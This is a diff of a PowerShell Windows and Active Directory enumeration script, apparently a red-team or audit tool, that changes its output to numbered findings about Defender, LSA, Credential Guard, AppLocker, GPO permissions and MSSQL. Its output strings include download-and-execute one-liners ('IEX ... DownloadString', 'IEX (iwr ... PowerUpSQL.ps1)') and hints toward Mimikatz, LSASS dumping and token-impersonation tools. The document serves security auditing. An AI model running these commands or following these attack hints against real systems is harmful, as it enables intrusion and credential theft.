@@ -26,9 +26,9 @@ function Run {
     try {
         $result = & $Block
         $result | Out-File "$OUT\$File" -Encoding utf8
-        Write-Host "[OK]   $Label -> $File" -ForegroundColor Green
+        Write-Host "[ OK ]   $Label -> $File" -ForegroundColor Green
     } catch {
-        Write-Host "[--]   $Label failed: $_" -ForegroundColor DarkGray
+        Write-Host "[ OK ]   $Label failed: $_" -ForegroundColor DarkGray
     }
 }
 
@@ -45,9 +45,9 @@ Write-Host ""
 
 $isAdmin = IsAdmin
 if ($isAdmin) {
-    Write-Host "[OK]   Running as administrator" -ForegroundColor Red
+    Write-Host "[ OK ]   Running as administrator" -ForegroundColor Red
 } else {
-    Write-Host "[OK]   Not running as administrator" -ForegroundColor Green
+    Write-Host "[ OK ]   Not running as administrator" -ForegroundColor Green
 }
 
 # Powershell downgrade
@@ -55,13 +55,13 @@ try {
     $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
     $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
     if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
-        Write-Host "[KO]   PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor DarkRed
-        Write-Host "       powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
+        Write-Host "          - [P005] PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor DarkRed
+        Write-Host "                    powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
     } else {
-        Write-Host "[OK]   PowerShell downgrade not possible" -ForegroundColor Green
+        Write-Host "          - PowerShell downgrade not possible" -ForegroundColor Green
     }
 } catch {
-    Write-Host "       - PowerShell downgrade requires more privs" -ForegroundColor DarkGray
+    Write-Host "          - PowerShell downgrade requires more privs" -ForegroundColor DarkGray
 }
 
 # Token Impersonation
@@ -69,23 +69,23 @@ if ($isAdmin) {
     try {
         $processes = Get-Process | Where-Object { $_.SessionId -gt 0 }
         if ($processes.Count -gt 1) {
-            Write-Host "       - Token impersonation might be possible: https://github.com/Shac0x/Invoke-Totem" -ForegroundColor DarkRed
+            Write-Host "          - [P010] Token impersonation might be possible: https://github.com/Shac0x/Invoke-Totem" -ForegroundColor DarkRed
         }
     } catch {
-        Write-Host "       - Token enumeration for impersonation failed" -ForegroundColor DarkYellow
+        Write-Host "          - Token enumeration for impersonation failed" -ForegroundColor DarkYellow
     }
 } else {
-    Write-Host "       - Token impersonation requires more privs" -ForegroundColor DarkGray
+    Write-Host "          - Token impersonation requires more privs" -ForegroundColor DarkGray
 }
 
 # Language Mode Check
 $languageMode = $ExecutionContext.SessionState.LanguageMode
 if ($languageMode -eq "FullLanguage") {
-    Write-Host "[KO]   PowerShell language mode: FullLanguage" -ForegroundColor DarkRed
+    Write-Host "[P015]   PowerShell language mode: FullLanguage" -ForegroundColor DarkRed
 } elseif ($languageMode -eq "ConstrainedLanguage") {
-    Write-Host "[OK]   PowerShell language mode: Constrained Language Mode" -ForegroundColor Green
+    Write-Host "[ OK ]   PowerShell language mode: Constrained Language Mode" -ForegroundColor Green
 } else {
-    Write-Host "[--]   PowerShell language mode:: $languageMode" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   PowerShell language mode: $languageMode" -ForegroundColor DarkYellow
 }
 
 Write-Host ""
@@ -95,12 +95,11 @@ $DefenderPreferences = Get-MpPreference
 $DefenderStatus = Get-MpComputerStatus
 $AMRunningMode = $DefenderStatus.AMRunningMode
 if ($AMRunningMode -eq "Normal" -or $AMRunningMode -eq "EDR Blocked") {
-    Write-Host "[OK]   Microsoft Defender is running in Active Mode" -ForegroundColor Green
+    Write-Host "[ OK ]   Microsoft Defender is running in Active Mode" -ForegroundColor Green
 } elseif ($AMRunningMode -eq "Passive" -or $AMRunningMode -eq "SxS Passive Mode") {
-    Write-Host "[KO]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkRed
-    
+    Write-Host "[P020]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkRed
 } else {
-    Write-Host "[??]   Microsoft Defender is running in $AMRunningMode $AMRunningMode" -ForegroundColor DarkYellow
+    Write-Host "[ ?? ]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkYellow
 }
 
 # Real-Time Protection
@@ -108,38 +107,38 @@ try {
     $realTimeEnabled = $defenderStatus.RealTimeProtectionEnabled
     $monitoringDisabled = $DefenderPreferences.DisableRealtimeMonitoring
     if ($realTimeEnabled -eq $true -or $monitoringDisabled -eq $false) {
-        Write-Host "       - Real Time Protection is enabled" -ForegroundColor Green
+        Write-Host "          - Real Time Protection is enabled" -ForegroundColor Green
     } else {
-        Write-Host "       [KO] Real Time Protection is disabled" -ForegroundColor DarkRed
+        Write-Host "          - [P025] Real Time Protection is disabled" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - Real-Time Protection status is unknown" -ForegroundColor DarkYellow
+    Write-Host "          - Real-Time Protection status is unknown" -ForegroundColor DarkYellow
 }
 
 # MDE Sensor
 try {
     $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
     if ($MDEservice.Status -eq "Running") {
-        Write-Host "       - Microsoft Defender for Endpoint Sensor is enabled" -ForegroundColor Green
+        Write-Host "          - Microsoft Defender for Endpoint Sensor is enabled" -ForegroundColor Green
     } else {
-        Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
+        Write-Host "          - [P030] Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
+    Write-Host "          - Microsoft Defender for Endpoint Sensor is unknown" -ForegroundColor DarkYellow
 }
 
 # Network Protection
 try {
     $NetworkProtectionValue = (Get-MpPreference).EnableNetworkProtection
     if ($NetworkProtectionValue -eq 1) {
-        Write-Host "       - Microsoft Defender for Endpoint Network Protection is enabled" -ForegroundColor Green
+        Write-Host "          - Microsoft Defender for Endpoint Network Protection is enabled" -ForegroundColor Green
     } elseif ($NetworkProtectionValue -eq 0) {
-        Write-Host "       - Microsoft Defender for Endpoint Network Protection is disabled" -ForegroundColor DarkRed
+        Write-Host "          - [P035] Microsoft Defender for Endpoint Network Protection is disabled" -ForegroundColor DarkRed
     } elseif ($NetworkProtectionValue -eq 2) {
-        Write-Host "       - Microsoft Defender for Endpoint Network Protection is in audit mode" -ForegroundColor DarkYellow
+        Write-Host "          - Microsoft Defender for Endpoint Network Protection is in audit mode" -ForegroundColor DarkYellow
     }
 } catch {
-    Write-Host "       - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
+    Write-Host "          - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
 }
 
 # Tamper Protection
@@ -147,21 +146,21 @@ $TamperProtectionStatus = $DefenderStatus.IsTamperProtected
 $TamperProtectionManage = $DefenderStatus.TamperProtectionSource
 
 if ($TamperProtectionStatus -eq $true) {
-    Write-Host "       - Tamper Protection is enabled" -ForegroundColor Green
+    Write-Host "          - Tamper Protection is enabled" -ForegroundColor Green
 } else {
-    Write-Host "       - Tamper Protection is disabled" -ForegroundColor DarkRed
+    Write-Host "          - [P040] Tamper Protection is disabled" -ForegroundColor DarkRed
 }
 
 # LSA Protection (RunAsPPL)
 try {
     $runAsPPL = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction Stop).RunAsPPL
     if ($runAsPPL -ge 1) {
-        Write-Host "       - LSA Protection (RunAsPPL) is enabled" -ForegroundColor Green
+        Write-Host "          - LSA Protection (RunAsPPL) is enabled" -ForegroundColor Green
     } else {
-        Write-Host "       - LSA Protection (RunAsPPL) is disabled - LSASS dump possible without driver" -ForegroundColor DarkRed
+        Write-Host "          - [P045] LSA Protection (RunAsPPL) is disabled - LSASS dump possible without driver" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - LSA Protection (RunAsPPL) not configured - LSASS dump possible without driver" -ForegroundColor DarkRed
+    Write-Host "          - [P045] LSA Protection (RunAsPPL) not configured - LSASS dump possible without driver" -ForegroundColor DarkRed
 }
 
 # Credential Guard
@@ -169,49 +168,49 @@ try {
     $cgEnabled = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
     $cgScenario = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
     if ($cgScenario -eq 1) {
-        Write-Host "       - Credential Guard is enabled - sekurlsa::logonpasswords will not yield NTLM hashes" -ForegroundColor Green
+        Write-Host "          - Credential Guard is enabled" -ForegroundColor Green
     } elseif ($cgEnabled -eq 1) {
-        Write-Host "       - Credential Guard: VBS enabled but scenario not confirmed" -ForegroundColor DarkYellow
+        Write-Host "          - Credential Guard: VBS enabled but scenario not confirmed" -ForegroundColor DarkYellow
     } else {
-        Write-Host "       - Credential Guard is not enabled - Mimikatz sekurlsa::logonpasswords likely works" -ForegroundColor DarkRed
+        Write-Host "          - [P050] Credential Guard is not enabled - Mimikatz sekurlsa::logonpasswords likely works" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - Credential Guard status could not be determined" -ForegroundColor DarkYellow
+    Write-Host "          - Credential Guard status could not be determined" -ForegroundColor DarkYellow
 }
 
 # Smart App Control
 try {
     $sacState = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -ErrorAction Stop).VerifiedAndReputablePolicyState
     if ($sacState -eq 1) {
-        Write-Host "       - Smart App Control is enabled" -ForegroundColor Green
+        Write-Host "          - Smart App Control is enabled" -ForegroundColor Green
     } elseif ($sacState -eq 2) {
-        Write-Host "       - Smart App Control is in evaluation mode, not blocking" -ForegroundColor DarkRed
+        Write-Host "          - [P055] Smart App Control is in evaluation mode, not blocking" -ForegroundColor DarkRed
     } else {
-        Write-Host "       - Smart App Control is disabled" -ForegroundColor DarkRed
+        Write-Host "          - [P055] Smart App Control is disabled" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - Smart App Control is not configured" -ForegroundColor DarkRed
+    Write-Host "          - [P055] Smart App Control is not configured" -ForegroundColor DarkRed
 }
 
 # PUA Protection
 try {
     $puaState = (Get-MpPreference).PUAProtection
     if ($puaState -eq 1) {
-        Write-Host "       - Potentially Unwanted Applications (PUA) Protection is enabled" -ForegroundColor Green
+        Write-Host "          - Potentially Unwanted Applications (PUA) Protection is enabled" -ForegroundColor Green
     } elseif ($puaState -eq 2) {
-        Write-Host "       - Potentially Unwanted Applications (PUA) Protection is just auditing, not blocking" -ForegroundColor DarkRed
+        Write-Host "          - [P060] Potentially Unwanted Applications (PUA) Protection is just auditing, not blocking" -ForegroundColor DarkRed
     } else {
-        Write-Host "       - Potentially Unwanted Applications (PUA) Protection is disabled" -ForegroundColor DarkRed
+        Write-Host "          - [P060] Potentially Unwanted Applications (PUA) Protection is disabled" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "       - PUA Protection status could not be determined" -ForegroundColor DarkYellow
+    Write-Host "          - PUA Protection status could not be determined" -ForegroundColor DarkYellow
 }
 
 # Behavior Monitoring
 if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
-    Write-Host "       - Behavior Monitoring is enabled" -ForegroundColor Green
+    Write-Host "          - Behavior Monitoring is enabled" -ForegroundColor Green
 } else {
-    Write-Host "       - Behavior Monitoring is disabled" -ForegroundColor DarkRed
+    Write-Host "          - [P065] Behavior Monitoring is disabled" -ForegroundColor DarkRed
 }
 
 # Memory Integrity
@@ -219,15 +218,15 @@ try {
     if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
         $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
         if ($hvciStatus -eq 1) {
-            Write-Host "       - Memory Integrity is enabled" -ForegroundColor Green
+            Write-Host "          - Memory Integrity is enabled" -ForegroundColor Green
         } else {
-            Write-Host "       - Memory Integrity is disabled" -ForegroundColor DarkRed
+            Write-Host "          - [P070] Memory Integrity is disabled" -ForegroundColor DarkRed
         }
     } else {
-        Write-Host "       - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
+        Write-Host "          - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
     }
 } catch {
-    Write-Host "       - Memory Integrity is unknown" -ForegroundColor DarkYellow
+    Write-Host "          - Memory Integrity is unknown" -ForegroundColor DarkYellow
 }
 
 # Exclusions
@@ -241,18 +240,18 @@ if ($isAdmin) {
                         ($exclusionProcesses -and $exclusionProcesses.Count -gt 0)
     
     if ($hasAnyExclusions) {
-        Write-Host "[KO]   Exclusions found" -ForegroundColor DarkRed
+        Write-Host "          - [P075] Defender Exclusions found" -ForegroundColor DarkRed
         if ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) {
-            Write-Host "       - Extension exclusions found" -ForegroundColor DarkRed
+            Write-Host "                   - Extension exclusions found" -ForegroundColor DarkRed
         }
         if ($exclusionPaths -and $exclusionPaths.Count -gt 0) {
-            Write-Host "       - Path exclusions found" -ForegroundColor DarkRed
+            Write-Host "                  - Path exclusions found" -ForegroundColor DarkRed
         }
         if ($exclusionProcesses -and $exclusionProcesses.Count -gt 0) {
-            Write-Host "       - Process exclusions found" -ForegroundColor DarkRed
+            Write-Host "                  - Process exclusions found" -ForegroundColor DarkRed
         }
     } else {
-        Write-Host "[OK]   No exclusions found" -ForegroundColor Green
+        Write-Host "          - No exclusions found" -ForegroundColor Green
     }
 
 # Exclusions through event ID    
@@ -268,18 +267,17 @@ if ($isAdmin) {
             }
         }
         if ($foundExclusions.Count -gt 0) {
-            Write-Host "[KO]   Exclusions detected via event logs" -ForegroundColor DarkRed
+            Write-Host "          - [P075] Exclusions detected via event logs" -ForegroundColor DarkRed
             foreach ($path in $foundExclusions) {
-                Write-Host "       - $path" -ForegroundColor DarkGray
+                Write-Host "                   - $path" -ForegroundColor DarkGray
             }
         } else {
-            Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
+            Write-Host "          - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
         }
     } catch {
-        Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
+        Write-Host "          - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
     }
 }
-
 
 # ASR Rules
 $asrRulesDefinitions = @{
@@ -314,33 +312,32 @@ if (IsAdmin) {
         }
     }
     if ($disabledCount -gt 0) {
-        Write-Host "       - some $disabledCount ASR rule(s) not enabled" -ForegroundColor DarkRed
+        Write-Host "          - [P080] $disabledCount ASR rule(s) not enabled" -ForegroundColor DarkRed
         foreach ($guid in $asrRuleGuids) {
             $index = [array]::IndexOf($asrRuleGuids, $guid)
             if ($asrStatuses[$index] -ne 1) {
                 $ruleName = $asrRulesDefinitions[$guid]
                 if ($ruleName) {
-                    Write-Host "       - $ruleName" -ForegroundColor DarkGray
+                    Write-Host "                  - $ruleName" -ForegroundColor DarkGray
                 }
             }
         }
     } else {
-        Write-Host "       - all ASR rules are enabled" -ForegroundColor Green
+        Write-Host "          - All ASR rules are enabled" -ForegroundColor Green
     }
 } else {
-    Write-Host "       - ASR rule enumeration requires more privs" -ForegroundColor DarkGray
+    Write-Host "          - ASR rule enumeration requires more privs" -ForegroundColor DarkGray
 }
 
 # BitLocker
 $bitlockerStatus = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')
 if ($bitlockerStatus -eq 1) {
-    Write-Host "[OK]   C: drive is BitLocker encrypted" -ForegroundColor Green
+    Write-Host "[ OK ]   C: drive is BitLocker encrypted" -ForegroundColor Green
 } elseif ($bitlockerStatus -eq 2) {
-    Write-Host "[KO]   C: drive is not BitLocker encrypted" -ForegroundColor DarkRed
+    Write-Host "[P085]   C: drive is not BitLocker encrypted" -ForegroundColor DarkRed
 } else {
-    Write-Host "[??]   C: drive BitLocker encryption is unknown" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   C: drive BitLocker encryption is unknown" -ForegroundColor DarkYellow
 }
-
 
 # WDAC
 try {
@@ -356,35 +353,39 @@ try {
     }
 
     if ($policyCount -gt 0) {
-        Write-Host "[OK]   WDAC Active Policies: $policyCount policies deployed" -ForegroundColor Green
+        Write-Host "[ OK ]   WDAC Active Policies: $policyCount policies deployed" -ForegroundColor Green
     } else {
-        Write-Host "[KO]   WDAC Active Policies: No policies deployed" -ForegroundColor DarkRed
+        Write-Host "[P090]   WDAC Active Policies: No policies deployed" -ForegroundColor DarkRed
     }
 
-    $ciLabel = switch ($codeIntegrityStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
-    $ciColor = switch ($codeIntegrityStatus) { 2 { "Green" } 1 { "DarkRed" } Default { "DarkRed" } }
-    $ciStatus = switch ($codeIntegrityStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
-    Write-Host "       - Kernel Mode Code Integrity: $ciLabel" -ForegroundColor $ciColor
+    switch ($codeIntegrityStatus) {
+        2 { Write-Host "          - Kernel Mode Code Integrity: Enforced" -ForegroundColor Green }
+        1 { Write-Host "          - [P091] Kernel Mode Code Integrity: Audit Mode only, not blocking" -ForegroundColor DarkRed }
+        0 { Write-Host "          - [P092] Kernel Mode Code Integrity: Off" -ForegroundColor DarkRed }
+        Default { Write-Host "          - [ -- ] Kernel Mode Code Integrity: Unknown ($codeIntegrityStatus)" -ForegroundColor DarkYellow }
+    }
 
-    $umciLabel = switch ($userModeStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
-    $umciColor = switch ($userModeStatus) { 2 { "Green" } 1 { "DarkRed" } Default { "DarkRed" } }
-    $umciStatus = switch ($userModeStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
-    Write-Host "       - User Mode Code Integrity: $umciLabel" -ForegroundColor $umciColor
+    switch ($userModeStatus) {
+        2 { Write-Host "          - User Mode Code Integrity: Enforced" -ForegroundColor Green }
+        1 { Write-Host "          - [P093] User Mode Code Integrity: Audit Mode only, not blocking" -ForegroundColor DarkRed }
+        0 { Write-Host "          - [P094] User Mode Code Integrity: Off" -ForegroundColor DarkRed }
+        Default { Write-Host "          - [ -- ] User Mode Code Integrity: Unknown ($userModeStatus)" -ForegroundColor DarkYellow }
+    }
 
 } catch {
-    Write-Host "[??]   WDAC: Unable to query" -ForegroundColor DarkYellow
+    Write-Host "          - WDAC: Unable to query" -ForegroundColor DarkYellow
 }
 
 # AppLocker
 try {
     $applockerService = Get-Service -Name "AppIDSvc" -ErrorAction Stop
     if ($applockerService.Status -eq "Running") {
-        Write-Host "[OK]   AppLocker Service (AppIDSvc) is running" -ForegroundColor Green
+        Write-Host "[ OK ]   AppLocker Service (AppIDSvc) is running" -ForegroundColor Green
     } else {
-        Write-Host "[KO]   AppLocker Service (AppIDSvc) is not running" -ForegroundColor DarkRed
+        Write-Host "[P095]   AppLocker Service (AppIDSvc) is not running" -ForegroundColor DarkRed
     }
 } catch {
-    Write-Host "[KO]   AppLocker Service (AppIDSvc) was not found" -ForegroundColor DarkRed
+    Write-Host "[P095]   AppLocker Service (AppIDSvc) was not found" -ForegroundColor DarkRed
 }
 
 $applockerRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
@@ -396,12 +397,12 @@ foreach ($collection in $applockerCollections) {
         $rules = Get-ChildItem -Path $collPath -ErrorAction SilentlyContinue
         if ($rules.Count -gt 0) {
             $applockerConfigured = $true
-            Write-Host "AppLocker $collection Rules :                                    [KO] $($rules.Count) rule(s) configured" -ForegroundColor DarkRed
+            Write-Host "          - AppLocker $collection Rules: $($rules.Count) rule(s) configured" -ForegroundColor DarkGreen
         }
     }
 }
 if (-not $applockerConfigured) {
-    Write-Host "       - There are no baselines or rules configured, all executables are allowed" -ForegroundColor DarkRed
+    Write-Host "          - [P096] AppLocker: No baselines or rules configured, all executables are allowed" -ForegroundColor DarkRed
 }
 
 # Edge SmartScreen
@@ -419,13 +420,14 @@ foreach ($path in $policyPaths) {
     }
 }
 if ($edgeSSvalue -eq 0) {
-    Write-Host "[KO]   Microsoft Edge SmartScreen is disabled" -ForegroundColor DarkRed
+    Write-Host "[P105]   Microsoft Edge SmartScreen is disabled" -ForegroundColor DarkRed
 } else {
-    Write-Host "[OK]   Microsoft Edge SmartScreen is enabled" -ForegroundColor Green
+    Write-Host "[ OK ]   Microsoft Edge SmartScreen is enabled" -ForegroundColor Green
 }
 
-
 Write-Host ""
+
+# Privs whoami /all
 $privMap = @{
     "SeDebugPrivilege"           = "Read LSASS / inject into any process"
     "SeImpersonatePrivilege"     = "Token impersonation -> PrintSpoofer/JuicyPotato"
@@ -438,33 +440,28 @@ $privMap = @{
     "SeTakeOwnershipPrivilege"   = "Take ownership of any object"
     "SeRelabelPrivilege"         = "Modify integrity levels"
 }
-
-Run "Privileges (whoami /all)" { whoami /all } "whoami_all.txt"
-
-$whoamiOut = whoami /priv
+$whoamiOut = whoami /all
+$whoamiOut | Out-File "$OUT\whoami_all.txt" -Encoding utf8
+Write-Host "[ OK ]   Privileges (whoami /all) -> whoami_all.txt" -ForegroundColor Green
 foreach ($priv in $privMap.Keys) {
     if ($whoamiOut -match $priv) {
-        Write-Host "       - $priv`: $($privMap[$priv])" -ForegroundColor DarkRed
+        Write-Host "          - [P110]   $priv`: $($privMap[$priv])" -ForegroundColor DarkRed
     }
 }
-
 Write-Host ""
-
 
 # SCCM/SCOM Enumeration
 try {
     $smContainer = Get-ADObject -Filter {Name -eq "System Management"} -SearchBase $([ADSI]"LDAP://RootDSE").defaultNamingContext -ErrorAction Stop
     
     if ($smContainer) {
-        Write-Host "[KO]   System Center infrastructure detected (SCCM/SCOM)" -ForegroundColor DarkRed
-        Write-Host "       - SCCM: Use SharpSCCM - https://github.com/Mayyhem/SharpSCCM" -ForegroundColor DarkGray
-        Write-Host "       - SCOM: Use SharpSCOM - https://github.com/breakfix/SharpSCOM" -ForegroundColor DarkGray
+        Write-Host "[P115]   System Center infrastructure detected (SCCM/SCOM)" -ForegroundColor DarkRed
+        Write-Host "          - SCCM: Use SharpSCCM - https://github.com/Mayyhem/SharpSCCM" -ForegroundColor DarkGray
+        Write-Host "          - SCOM: Use SharpSCOM - https://github.com/breakfix/SharpSCOM" -ForegroundColor DarkGray
     }
 } catch {
-    Write-Host "[OK]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
+    Write-Host "[ OK ]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
 }
-
-
 
 # GPO ACL Check (AD level)
 $dangerousPerms = @("GpoEditDeleteModifySecurity", "GpoEdit", "GpoApply")
@@ -487,15 +484,15 @@ try {
   }
 
   if ($gpoFindings.Count -gt 0) {
-    Write-Host "[KO]   $($gpoFindings.Count) GPO(s) with non-admin write permissions" -ForegroundColor DarkRed
+    Write-Host "[P120]   $($gpoFindings.Count) GPO(s) with non-admin write permissions" -ForegroundColor DarkRed
     foreach ($f in $gpoFindings) {
-      Write-Host "       L- '$($f.GPO)' - $($f.Trustee) ($($f.Permission))" -ForegroundColor DarkRed
+      Write-Host "          - '$($f.GPO)' - $($f.Trustee) ($($f.Permission))" -ForegroundColor DarkRed
     }
   } else {
-    Write-Host "[OK]   No non-admin GPO write permissions found" -ForegroundColor Green
+    Write-Host "[ OK ]   No non-admin GPO write permissions found" -ForegroundColor Green
   }
 } catch {
-  Write-Host "[--]   GPO ACL check requires RSAT GroupPolicy module" -ForegroundColor DarkYellow
+  Write-Host "[ -- ]   GPO ACL check requires RSAT GroupPolicy module" -ForegroundColor DarkYellow
 }
 
 # SYSVOL File ACL Check
@@ -519,20 +516,19 @@ try {
     }
 
     if ($sysvolFindings.Count -gt 0) {
-      Write-Host "[KO]   $($sysvolFindings.Count) SYSVOL GPO folder(s) with non-admin write permissions" -ForegroundColor DarkRed
+      Write-Host "[P125]   $($sysvolFindings.Count) SYSVOL GPO folder(s) with non-admin write permissions" -ForegroundColor DarkRed
       foreach ($f in $sysvolFindings) {
-        Write-Host "       L- $($f.Folder) - $($f.Identity) ($($f.Rights))" -ForegroundColor DarkRed
+        Write-Host "          - $($f.Folder) - $($f.Identity) ($($f.Rights))" -ForegroundColor DarkRed
       }
     } else {
-      Write-Host "[OK]   No non-admin SYSVOL write permissions found" -ForegroundColor Green
+      Write-Host "[ OK ]   No non-admin SYSVOL write permissions found" -ForegroundColor Green
     }
   } else {
-    Write-Host "[--]   SYSVOL path not accessible" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   SYSVOL path not accessible" -ForegroundColor DarkYellow
   }
 } catch {
-  Write-Host "[--]   SYSVOL ACL check failed: $_" -ForegroundColor DarkYellow
+  Write-Host "[ -- ]   SYSVOL ACL check failed: $_" -ForegroundColor DarkYellow
 }
-
 
 # Tombstone deleted AD objects
 try {
@@ -543,13 +539,13 @@ try {
         if ($Deleted) {
             $Count = ($Deleted | Measure-Object).Count
             $Deleted | Select-Object Name, ObjectClass, whenChanged, LastKnownParent | Out-File "$OUT\tombstone.txt" -Encoding utf8
-            Write-Host "[KO]   $Count deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
+            Write-Host "[P130]   $Count deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
             $Interesting = $Deleted | Where-Object { $_.Name -match "svc|admin|backup|sql|service|mgmt" }
             if ($Interesting) {
-                $Interesting | ForEach-Object { Write-Host "       - $($_.Name) [$($_.ObjectClass)]" -ForegroundColor DarkGray }
+                $Interesting | ForEach-Object { Write-Host "             - $($_.Name) [$($_.ObjectClass)]" -ForegroundColor DarkGray }
             }
         } else {
-            Write-Host "[OK]   No deleted objects in tombstone" -ForegroundColor Green
+            Write-Host "[ OK ]   No deleted objects in tombstone" -ForegroundColor Green
         }
     } else {
         $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -563,13 +559,13 @@ try {
         $Results = $Searcher.FindAll()
         if ($Results.Count -gt 0) {
             $Results | ForEach-Object { "$($_.Properties['name']) [$($_.Properties['objectclass'][-1])]" } | Out-File "$OUT\tombstone.txt" -Encoding utf8
-            Write-Host "[KO]   $($Results.Count) deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
+            Write-Host "[P130]   $($Results.Count) deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
         } else {
-            Write-Host "[OK]   No deleted objects in tombstone" -ForegroundColor Green
+            Write-Host "[ OK ]   No deleted objects in tombstone" -ForegroundColor Green
         }
     }
 } catch {
-    Write-Host "[--]   Tombstone check failed, is the device AD joined?" -ForegroundColor DarkYellow
+    Write-Host "[ -- ]   Tombstone check failed, is the device AD joined?" -ForegroundColor DarkYellow
 }
 
 # MSSQL Enumeration
@@ -591,7 +587,7 @@ try {
 $instances = $instances | Sort-Object -Unique
 if ($instances) {
     $mssqlLog = "$OUT\mssql_enum.txt"
-    "[KO]   MSSQL Instances Found:`n$($instances -join "`n")" | Add-Content $mssqlLog
+    "[P135]   MSSQL Instances Found:`n$($instances -join "`n")" | Add-Content $mssqlLog
     "`nPowerUpSQL Enumeration:`nIEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1').Content" | Add-Content $mssqlLog
     "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {`$_.Status -eq 'Accessible'} | Get-SQLServerPrivEscRowThreated" | Add-Content $mssqlLog
     "`nExploit References:`n- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL`n- xp_cmdshell abuse, impersonation, linked servers" | Add-Content $mssqlLog
@@ -616,24 +612,36 @@ if ($instances) {
             }
         } catch { }
     }
-    Write-Host "[KO]   MSSQL instances detected -> mssql_enum.txt" -ForegroundColor DarkRed
-    Write-Host "       - PowerUpSQL: https://github.com/NetSPI/PowerUpSQL" -ForegroundColor DarkGray
+    Write-Host "[P135]   MSSQL instances detected -> mssql_enum.txt" -ForegroundColor DarkRed
+    Write-Host "             - PowerUpSQL: https://github.com/NetSPI/PowerUpSQL" -ForegroundColor DarkGray
 } else {
-    Write-Host "[OK]   No MSSQL instances detected" -ForegroundColor Green
+    Write-Host "[ OK ]   No MSSQL instances detected" -ForegroundColor Green
 }
 
 Write-Host ""
 
 # Admins and logged on users
-$adminOutput = net localgroup administrators
+$adminRaw = net localgroup administrators
+$adminMembers = $adminRaw | Select-Object -Skip 6 | Where-Object {
+    $_ -notmatch "^-+$" -and
+    $_ -notmatch "The command completed" -and
+    $_ -notmatch "^\s*$"
+}
 $loggedOutput = query user 2>$null
+$loggedUsers = $loggedOutput | Select-Object -Skip 1 | Where-Object { $_ -notmatch "^\s*$" } | ForEach-Object {
+    $_ -replace "^>", " " -replace "\s+", " "
+}
 $combined = @()
-$combined += "=== LOCAL ADMINS ===" 
-$combined += $adminOutput
-$combined += "`n=== LOGGED ON USERS ==="
-$combined += $loggedOutput
+$combined += "=== LOCAL ADMINS ==="
+$combined += $adminMembers
+$combined += ""
